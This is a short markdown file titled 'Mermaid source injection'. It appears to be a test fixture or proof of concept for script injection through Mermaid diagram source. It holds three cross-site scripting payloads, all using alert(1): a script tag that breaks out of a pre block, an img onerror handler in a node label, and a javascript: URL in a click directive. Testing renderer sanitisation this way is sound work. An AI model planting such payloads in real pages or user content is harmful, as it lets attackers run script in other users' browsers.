# Mermaid source injection

```mermaid
</pre><script>alert(1)</script><pre>
graph TD
  A["<img src=x onerror=alert(1)>"] --> B
  click A "javascript:alert(1)"
```
